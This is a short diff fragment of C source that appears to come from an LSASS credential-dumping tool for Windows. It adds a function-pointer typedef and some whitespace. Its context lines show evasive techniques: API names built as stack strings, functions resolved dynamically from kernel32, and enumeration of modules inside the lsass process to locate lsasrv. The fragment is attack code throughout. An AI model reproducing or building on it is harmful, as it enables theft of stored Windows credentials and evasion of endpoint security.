@@ -85,6 +85,12 @@ BOOL
     SIZE_T* lpNumberOfBytesRead
     );
 
+
+typedef
+HANDLE
+(NTAPI* PNT_GetCurrentProcess)(
+    );
+
 typedef
 BOOL
 (NTAPI* PNT_WriteFile)(
@@ -369,7 +375,7 @@ int main() {
 
     HMODULE lsassDll[1024];
     DWORD bytesReturned;
-    char modName[50] ;
+    char modName[50];
     char* lsass = NULL, * lsasrv = NULL;
 
     // EnumProcessModules和GetModuleFileNameExA需要从psapi.dll中获取
@@ -393,6 +399,9 @@ int main() {
     MYS_ecureZeroMemory(stack_string, 50);
     stack_string[0] = 'W'; stack_string[1] = 'r'; stack_string[2] = 'i'; stack_string[3] = 't'; stack_string[4] = 'e'; stack_string[5] = 'F'; stack_string[6] = 'i'; stack_string[7] = 'l'; stack_string[8] = 'e';
     PNT_WriteFile NT_WriteFile = (PNT_WriteFile)NT_GetProcAddress((HMODULE)_kernel32_base_addr, stack_string);
+
+
+
 
     if (NT_EnumProcessModules(_lsass_handle, lsassDll, sizeof(lsassDll), &bytesReturned)) {
 
